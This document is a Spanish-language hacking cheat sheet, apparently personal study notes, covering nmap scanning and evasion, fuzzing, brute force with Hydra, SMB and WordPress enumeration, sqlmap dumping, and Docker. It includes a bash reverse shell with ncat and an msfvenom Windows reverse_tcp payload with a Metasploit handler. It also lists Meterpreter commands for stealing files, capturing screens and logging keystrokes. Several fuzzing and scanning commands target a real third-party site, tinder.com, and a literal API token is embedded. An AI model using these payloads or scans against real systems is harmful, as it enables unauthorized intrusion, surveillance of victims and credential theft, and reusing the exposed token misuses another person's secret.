# Comandos basicos

Etiquetas: #hacking #comandos #nmap #macchanger #fuzzing #docker #sql-injection #meterpreter

ip a

Ver tus tarjetas de red con las IP, MAC, entre otros

man [programa]

Ver el manual de un programa

man nmap

Ver el manual del programa nmap

timeout 1 bash -c "ping -c 1 192.168.1.1" &>/dev/null

Envia 1 ping a la direccion IP objetiva, antes del ping se le añadio un timeout para detener el comando despues de x segundos en caso de que el host no responda y el &>/dev/null para no poner errores en la consola

Nota

Los programas que se ejecutar en la terminal como nmap tiene su propia terminal, donde muestran una guia rapida de comandos


## Macchanger

macchanger -l | grep -i [nombre de la empresa]

Abre macchanger, con -l hace una lista de las direcciones MAC de las empresas (OUI) y se filtra por el nombre deseado a buscar

macchanger -l | grep -i [VMware]

Muestra todas las OUI de la empresa VMware


## Nmap

nmap [puerto(s)] [ip (primer host)] [atributos/parametros]

Escaneo de redes especificando la IP a usar, lo mas recomendable es usar el primer host de la IP debido a que se aloja el router. Este escaneo encontrara los puertos abriertos asi como la direccion MAC

nmap -p- 192.168.100.1

Hace un repote del escaneo a la IP asignada, este usa la del primer host debido que ahi se aloja el router, poniendo -p- especificas escanear todos los puertos

nmap --top-ports 500 192.168.100.1

Poniendo top ports especificas que solo haga un escaneo de los puertos mas usados, en este caso los 500 puertos

nmap --top-ports 500 --open 192.168.100.1

Especificas solo puertos abiertos

nmap -p- 192.168.100.1 -v

Con verbose especificas que te muestre informacion mientras se hace el escaneo

nmap -p- 192.168.100.1 -v -n

Con -n No haces resolucion DNS

nmap -p- -T5 --open 192.168.100.1 -v

Ajusta velocidades de escaneo con -T, estos pueden ser desde T0 (escaneo mas sigiloso posible) hasta T5 [muy rapido)

nmap -p22 -sT --open 192.168.100.1 -v -n

Con -sT usa el modo de escaneo TCP usando el metodo Three-Way Handshake

nmap -p- -T5 --open 192.168.100.1 -v -n -Pn

Usando -Pn, se hace el escaneo sin verificar antes si el Host esta encendido o funciona

nmap -p- --open 192.168.100.1 -v -n -sU

A diferencia de -Pn, -sU escanea con UDP

nmap -sn 192.168.100.0/24

Verifica los dispositivos conectado a una misma red con -sn,

nmap -sn 192.168.100.0/24 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort

Aparte de verificar tambien imprime y ordena las Ips con grep y sort

nmap -O 192.168.100.75;

Verifica que sistema operativo usa, su direccion MAC, puerto abierto para transferir con -O

nmap -p22,80 -sV 192.168.100.1

Con -sV lanza mas peticiones a los puertos especificos para obtener la version exacta del puerto corriendo

nmap -p22 192.168.100.1 -f

Fragmenta los paquetes con -f para que despues el destinatario reconstruya los paquetes dependiendo de las reglas de su firewall, los fragmenta en 8 bytes

nmap -p22 192.168.100.1 --mtu

Personalizando la fragmentacion de bytes se usa -mtu, puede ser 8, 16, 32, 64, 128, etc.??

nmap -p22 192.168.100.1 -D 192.168.100.215

El Decoy Scan se hace con -D, envia paquetes desde la IP real y a la vez en uno falso usado de señuelo

nmap -p22 192.168.100.1 --data-length 21

Añade un longitud de datos mayor al paquete de datos usando --data-length

nmap -p22 192.168.100.1 --spoof-mac Dell -Pn

Cambia la direccion MAC en el paquete de datos con --spoof-mac, usando una de Dell

nmap -p22 192.168.100.1 --spoof-mac 00:11:22:33:44:55 -Pn

Tambien se permite usar una direccion MAC personalizado

nmap -p- --open -sS --min-rate 5000 -v -n -Pn 192.168.100.1

Ahora este contiene -sS y –min-rate. El -sS realiza escaneo tipo SYN sin establecer una coneccion completa, evitando el Firewall. Mientras que –min-rate se permite controlar la velocidad del manejo de los paquetes evitando que el Firewall detecte anomalias de manipulacion de paquetes

nmap -p22 192.168.100.1 -sC -sV

Con el parametro -sC podras ejecutar diversos scripts de nmap, estos se ubica en /usr/share/nmap/scripts/. Los scripts a ejecutar vendrian siendo pocos, en donde estos sean rapidos de ejecutar, puedan extraer informacion valiosa o datos comunes, y no romper nada o realizar ataques de fuerza bruta pesados

nmap -p22 192.168.100.1 -sCV

Ejecita -sC y -sV al mismo tiempo con -sCV

locate .nse | xargs grep "categories" | grep -oP '".*?"' | sort -u

Muestra todas las categorias que existen en los scripts de nmap

nmap -p22 192.168.100.1 –script=”vuln and safe” -sV

Si quieres ejecutar scripts mas especificos se puede usar –script, en este caso al poner “vuln and safe” nmap usara los scripts default que se usan en esas 2 categorias

nmap -p80 192.168.100.75 --script http-enum -sV

Ejecutacion de un script en especifico, en este caso el http-enum


## Redes

tcpdump -i wlan0 -w Captura.cap -v

Analiza paquetes de datos en la red al igual que Wireshark pero sin graficos, indicando la interfaz con -i y guardar los datos en un archivo con -w

sudo tcpdump -i lo -w Captura.cap -v

Analizando paquetes de datos pero en pa loopback

wireshark Captura.cap &>/dev/null & disown

Puedes Abrir la captura que tomaste con wireshark y asi tener un vistaso grafico del analisis obtenido

tshark -r Captura.cap 2>/dev/null

Tshark es la alternativa a Wireshark en la terminal

tshark -r Captura.cap -Y "http" 2>/dev/null | grep "GET"

Filtra usando el atributo -Y, si quieres ver informacion mas especifica lo puedes combinar con grep

tshark -r Captura.cap -Y "http" 2>/dev/null -Tfields -e tcp.payload | xxd -ps -r | grep “GET” | awk ‘{print $2}’

con -Tfields y -e puedes extraer los datos del campo especifico, ya sea tanto la peticion como la respuesta, como se entregan los datos en puro hexadecimal pues usas xxd para convertirlo a ASCII, leyendo los datos con -ps y hacer la conversion inversa con -r

arp-scan -I wlan0 --localnet –ignoredups

netdiscover -i wlan0

Verifica que otros dispositivos estan conectados en la misma red, con -ignoredups ignoras fuplicados. Esto es lo mismo que el atributo -sN en nmap

sudo masscan -p21,22,139,445,8080,80,443 -Pn 192.168.0.0/16 --rate=10000;

Es lo parecido al atributo de -sN de nmap, pero a diferencia de nmap que suele hacer escaneos de manera sigilosa, masscan se encarga de hacer grandes y rapidos escaneos, a manera de una verificacion rapida, puedes hacer escaneos a Ips de Clase B, especificando los puertos a escanear y ajustando la velocidad del escaneo con --rate

nmap --script ftp-anon -p21 127.0.0.1


## Subdominio

gobuster vhost -u https://tinder.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 20 –append-domain | grep -v "403"

Busca Virtual Hosts con Gobuster, con -u defines la URL del objetivo, con -w el diccionario a usar, con -t los hilos (peticiones simultaneas), poniendo –append-domain para mostrar paginas accesibes y por ultimo poniendo grep con -v indicas mostrar todo excepto el status de 403 prohibido

wfuzz -c -t 20 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hc 403,404 -H "Host: FUZZ.tinder.com" http://tinder.com/

Mismo uso con wfuzz, siendo mas flexible que gobuster permitiendo meter el diccionario FUZZ en cualquier parte de la peticion HTTP, con -c imprime los codigos de estado con color dando decoracion, se implementa hilos con -t, asi como la ruta del diccionario con -w, con –hc el filtro de salida que no salga 403 ni 404, con -H que es lo que quieres modificar especificando el subdominio, y por ultimo se coloca el objetivo

python3 /opt/Sublist3r/sublist3r.py -d tinder.com;

Ahora con Sublist3r, en este caso se dirige a su archivo .py y se especifica la dirreccion con -d


## Fuzzing

gobuster dir -u https://tinder.com/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 50 --exclude-length 505875 --add-slash -b 403,404 -x php,html,txt

Busca rutas de una pagina con gobuster, especificando con dir en vez de vhost, usa -u para la direccion de la pagina, -w para el diccionario, -t para hilos, con –exclude-length ignoras el mensaje del archivo que pesa lo indicado, pues es un falso positivo que envia al servidor indicando que todas las rutas existe. Con –add-slash es agregar un / al final de cada palabra del diccionario, y con -x especificamos extensiones, por cada modulo y direccion tambien agregara las extensiones especificadas como php, html y txt.

wfuzz -c --hc=404,403 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://tinder.com/FUZZ;

Lo mismo pero con wfuzz, especificas con “FUZZ” despues de la direccion web y no antes como los subdominios

wfuzz -c --sl=38 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://tinder.com/FUZZ

Parametro --sl para mostrar resultados con un numero especifico de lineas

wfuzz -c --hl=38 -t 200 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt https://tinder.com/FUZZ

Parametro –hl para mostrar resultados que no sean un numero especifico de lineas

wfuzz -c -t 50 --conn-delay 1 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -z list,html-txt-js --hc 403,404,429 https://tinder.com/FUZZ.FUZ2Z;

Con el parametro -z hace las busquedas de los modulos pero con las extensiones añadidas, cabe aclarar que como es un segundo payload se le tiene que agregar “FUZ2Z”, “FUZ3Z” para el tercer payload y asi sucecivamente. Usando --conn-delay es un tiempo de retrazo, fundamental para que no se vaya a bloquear la IP tan rapido


## Google Dorxs

site:[pagina]

Mostrar solamente resultados de esa pagina

site:tinder.com

Mostrar solamente resultados de la pagina de tinder

filetype:[tipo de archivo]

Mostrar solamente una extension de archivo especifico

intitle:[palabra clave]

Busca palabras clave dentro del título de la página web.

inurl:[modulo en la pagina]

Busca palabras que estén dentro de la dirección URL.

intext:[palabra clave]

Busca palabras clave dentro del contenido de la página.

-

Excluye resultados

cache:[pagina]

Muestra la versión guardada por Google (si la web bajó).

link:[link]

Busca páginas que tengan enlaces hacia ese sitio.

site:*.tinder.com

Comodín que sustituye cualquier palabra.


## Docker

FROM [SO:[version]]

MAINTAINER [nombre]

RUN [comando]

EXPOSE [puerto]

ENTRYPOINT [servicio]

Elementos que debe de tener el dockerimage, pues en FROM se especifica la version en si del SO mientras que MAINTAINER el Autor. Con Run puedes ejecutar un comando al momento de correr el contenedor, con EXPOSE abres un puerto, con ENTRYPOINT abres un servicio

FROM ubuntu:latest

MAINTAINER FabCA

RUN apt update && apt install -y net-tools \ apache2

EXPOSE 80

ENTRYPOINT service apache2 start

Se especifica el tipo de SO ubuntu, y con latest se especifica la ultima version, el maintainer nombre o apodo del autor, con RUN siempre se ejecuta apt update y apt install, con EXPOSE abres el puerto 80 y con ENTRYPOINT abres un servicio

docker build -t [nombre] [ruta]

docker build -t my_first_image .

Construccion de una imagen docker, usando -t para especificar el nombre, siempre cada modificacion que se haga se guarda con un build y la imagen donde se estuvo trabajando

docker images

Ver todos tus repositorios de imagenes docker

docker pull debian:latest

Importa un SO y sus dependencias a instalar, en este caso debian

docker run -dit –name myContainer my_first_image

Ejecuta un contenedor de docker, usa atributos como -d para correr en segundo plano, -i para que sea interactivo y -t para permitir el uso de

una consola virtual, se usa --name para ponerle nombre del contenedor y despues se especifica ruta de la imagen de docker. El run solo se usa para ejecutar por primera vez

docker ps -a

docker ps -q

docker ps

Muestra el o los contenedores ejecutandose actualmente, puedes usar -a para listar todos los contenedores, o -q solo mostrando los ID de los contenedores

docker exec -it myContainer bash

Ejecutar un comando dentro del contenedor activo, con -i de interactivo y -t de consola virtual, con bash ejecuta la terminal bash

docker stop [nombre/ID]

Detiene un contenedor Docker

docker rm [nombre]

Borra un contenedor

docker rm $(docker ps -a -q) --force

Borra todos los contenedores a la vez , usando --force permite detenerlo automaticamente

docker rmi [nombre/ID]

docker rmi one piece sad song(docker images -q)

Borra tuna imagen de Docker

docker rmi $(docker images --filter "dangling=true" -q)

Borra contenedores donde no tengan nombre o etiqueta, como limpieza de corrupcion

docker run -dit -p 80:80 --name myWebServer ubuntu_image

Corre un contenedor pero aplicas forwarding para que el puerto 80 de la PC principal sea el puerto 80 del contenedor

docker start [nombre]

docker start myWebServer

Vuelve a iniciar un nuevo contenedor de docker

docker port [nombre]

docker port myWebServer

Con port te dice qué puertos de tu máquina real (host) están conectados a los puertos del contenedor.

docker run -dit -p [puerto] -v [direccion nativo]:[direccion contenedor] --name [nombre] [imagen]

docker run -dit -p 80:80 -v /home/fabca06/Escritorio/Apuntes_Hacking/Introduccion_Hacking/docker/:/var/www/html/ --name myWebServer ubuntu_image

Creas un montaje con -v, es basicamente un puente donde tu archivo del contenedor se sincroniza con el archivo de tu nativo y los datos estan guardados en los 2, en tiempo real

docker logs [nombre] -f

docker logs myWebServer -f

Checa los logs que te lanza docker del contenedor, puedes poner -f para actualizar en tiempo real los logs

docker port [nombre]

docker port myWebServer

Checa el puerto de un contenedor

docker volume ls

Gestiona los volumenes de almacenamiento creados


## Enumeracion de servicio

ftp [direccion IP]

ftp (127.0.0.1)(localhost)

Protocolo FTP (File Transfer Protocol)

hydra -l [nombre] -P [ruta diccionario] [ruta servicio] -t [n.º de hilos]

hydra -l fabca06 -P /usr/share/wordlists/rockyou.txt ftp://127.0.0.1 -t 15

hydra -l fabca06 -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 2223 -t 15 -vV

Usa Hydra para realizar ataques de fuerza bruta, con -l indicas el login mientras que con -P la ruta donde esta la lista de las contraseñas a probar, ya despues pones la ruta del servicio, con -t los hilos, con -s especificas el puerto a usar, -v para verbose y -V para mostrar para usuario y contraseña usandose

openssl s_client -connect [ruta]:[puerto]

openssl s_client -connect tinder.com:443

Herramienta para analizar paginas.Con s_clientindicas conexiones TLS/SSL, con connect Indica la dirección, pones ruta y puerto. openssl solo analiza la informacion obtenida de una conexión pero da informacion del certificado y el algoritmo de cifrado con tu equipo

sslscan [ruta]

sslscan tinder.com

A diferencia de openssl, sslscan analiza varias conexiones, obteniendo lista de versiones de SSL y TLS que se usa, todos los algoritmos de cifrado que acepta, y vulnerabilidades famosas

python3 ssltest.py 127.0.0.1 -p 8443 | grep -v "00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00"

Envia paquetes de datos en hexadecimal, para comprobar la vulnerabilidad de Heartbleed. La vulerabilidad es basicamente rellenar los datos con contenido aleatorio para que pese con los datos solicitados

smbclient -L 127.0.0.1 -N

smbclient //127.0.0.1/myshare -N

Realiza pruebas a un servidor como cliente con el protocolo SMB, dirigiendolo a una direccion y con -N registrarse como anonimo y sin contraseña. Ya despues te puedes conectar al servicio

crackmapexec smb 127.0.0.1

Enumeracion de SMB, revisando si estaba abierto puerto 445, analizaje de metadatos, nombre Hostname, version de SO, verifica si el servidor exige firmas digitales en los paquetes de red

searchsploit [tecnologia] [vulnerabilidad]

searchsploit wordpress user enumeration

Busca si hay una vulnerabilidad para la tecnologia aplicada

searchsploit -x php/webapps/41497.php;

Con -x y pasando la ruta analizas el codigo del script con la vulnerabilidad

wpscan --url http://127.0.0.1:31337 -e vp,u --api-token [token]

escaneo de vulnerabilidades esclusivo de WordPress, usa -e para enumerar vulnerabilidades (vp) y usuarios (u). WordPress no pasa toda la informacion de golpe, pues

wpscan --url http://127.0.0.1:31337/ --random-user-agent --detection-mode aggressive --enumerate u,ap,at,cb,dbe --plugins-detection aggressive --plugins-version-detection aggressive --themes-detection aggressive --api-token "aca tu api token" --format cli --api-token 'GgqZdnqLTswWu8P3s8UdkmwDgLFG8P5dBBpZRcisgME'

Escaneo completo. Con –random-user-agent cambia la identidad aleatoriamente, con --detection-mode aggressive haces escaneo masivo, en el -e tambien esta ap para todos los plugins, at para todas plantillas visuales, cb para copas de seguridad, dbe para bases de datos expuestos, y esta –formatcli para optimizar resultados

perl joomscan.pl -u http://localhost:8080

Enumeracion para Joomla, especificando direccion con -u

magescan.phar scan:all http://127.0.0.1:8080

Escaneo para Magescan


## Payloads con Ncat y Meterpreter

ncat -e /bin/bash 127.17.0.1 443

Escucha a otro dispositivo

rlwrap nc -nlvp

Escucha desde otro dispositivo, con rlwrap sirve de complemento para limpiar pantalla con Control L, asi como otros

msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.97 LPORT=4646 -f exe -o reverse.exe

Generacion de payloads, con -p defines el payload que en este caso sera para windows de 64 bits, la shell a usar como meterpreter, el tipo de conection en reverse_tcp osea reverse shell, ahora pones la IP de la victima y un puerto para escuchar, ya de ahi con -f creas un tipo de ejecutable, en este caso para Windows, y con -o el nombre del script

sudo msfdb run

use exploit/multi/handler

set PAYLOAD windows/x64/meterpreter/reverse_tcp

set LHOST 192.168.100.75

set LPORT 4646

run

tras crear el .exe con msfvenom, usas msfdb run que ya es un programa dedicado a comprometer el dispositivo, mencionando el mismo payload, mencionando tu propia IP y puerto para la escucha, ya de ahi run y esperas a que la victima abra el .exe para comprometer la PC

background

Lleva a una sesion a segundo plano

sessions -K

Cierra todas las sesiones de golpe

sessions -u [ID]

Actualiza automaticamente una sesion de cmd a shell de meterpreter

sessions -c “[comando]”

Ejecuta un comando en todas las sesiones al mismo tiempo

sessions -i [ID]

Si pusiste una sesion en segundo plano, puedes volver con su ID

search [palabra clave]search post/windows/gather

Busca modulos especificos en la base de datos, como post/windows/gather

info [modulo]

Checa informacion de un modulo

options/show options

Muestra variables necesarias para configurar (Ips, puertos, rutas) antes de lanzar el modulo

use post/windows/gather/enum_patches

Revisa actualizaciones de seguridad de Microsoft importantes que faltan a la maquina virtual

use post/windows/gather/checkvm

Analiza hardware y controladores para determinar si la victima es maquina fisica o virtual

use post/windows/gather/enum_applications

Genera lista completa del software instalado en sistema de la victima

jobs

Checa los procesos corriendo en el sistema

spool [ruta archivo].txt

Toda la informacion de log la puedes guardar dentro de un archvo

makerc [ruta archvo].rc

Guarda todos los comandos escritos en un script

msfconsole -r [ruto archivo].rc

Ejecuta todo el script guardado


## 10.1 Comandos dentro de sesion activa de Meterpreter

ls

Listar archivos y carpetas

cd [ruta]

Cambio de directorio

pwd

Mostrar ruta exacta

cat [archivo]

Mostrar contenido de un archivo

download [ruta]

download "C:\Users\marai\Documents\nota.txt"

Descarga un archivo de la maquina victima al atacante

upload [ruta_local]

Sube un archivo desde maquina atacante a la victima

search -f [nombre]

Busca archivos en el sistema

sysinfo

Mostrar detalles tecnicos de la maquina

getuid

Nombre del usuario de la maquina victima

ps

Lista todos los programas y procesos ejecutandose

migrate [PID]

Muda el proceso de Meterpreter a otro programa en ejecucion

shell

Abre una consola de windows cmd, ejecutando comandos nativos

netstat

Mostrar conexiones de red activas de la victima

ipconfig/ifconfig

Mostrar interfaces de red de la maquina y direcciones IP asignadas

arp

Mostrar tabla ARP, permitiendo ver otros dispositivos e Ips locales

screenshot

Toma captura estatica de lo que el usuario ve en el monitor

screenshare

Inicia transmision en tiempo real por medio de navegador web

keyscan_start

Registra en silencio las teclas que el usuario presione en el teclado

keyscan_dump

Mira el texto que el usuario ha escrito desde que se inicio el escaneo

keyscan_stop

Detener registro del teclado


## Enumeracion de sistema con lse

./lse.sh

Ejecuta el script, que es un enumeracion inteligete buscando de varias maneras como escalar privilegios

./lse.sh -l 2;

Con -l 2, puedes hacer que te de informacion mas especifica cuando en un escaneo especifico haya encontrado resultados esperados que puedan convertirte en root

./LinEnum.sh

Ejecuta el script, que es un enumeracion inteligete buscando de varias maneras como escalar privilegios

systemctl list-timers

Checa tareas CRON, cuanto tiempo falta para ejecutarse, incluyendo tareas del sistema

cat /etc/crontab

Lista de todos las tareas CRON

getcap -r / 2>dev/null

Checa todas las capability y que tienen en especifico

ps

Checa procesos que se ejecuten por ti mismo y creados de la misma terminal

ps -eo command

Con -e especificas todos los procesos del sistema, con -o especificas que solo muestre columna especifica, en este caso el comando como tal


## Vulnerabilidad SQL Injection

sqlmap -r request.req -p searchitem --batch -D sqlitraining --tables

Explota vulnerabilidades de SQL con SQLMap, donde con -r especificas leer una peticion HTTP guardada en un archivo de texto, con -p especificas a que parametro unicamente quieres inyectar SQLI, con --batch es no preguntar nada, que tome decisiones por su propia cuenta, con -D especificas la base de datos que quieres apuntar, y con --tables es enumerar y mostrar las tablas adentro en caso de encontrarlos

sqlmap -r request.req -p searchitem --batch -D sqlitraining -T users --columns;

Una vez enumerado la base de datos, puededs usar -T para revisar una tabla en especifica y luego enumerar las columnas para ver las variables

sqlmap -r request.req -p searchitem --batch -D sqlitraining -T users -C username,password --dump;

Despues, una vez vista las columnas puedes dumpearlas para ver los campos especificados con -C (usuario y contraseña), y especificando --dump para mostrar los Hashes tambien
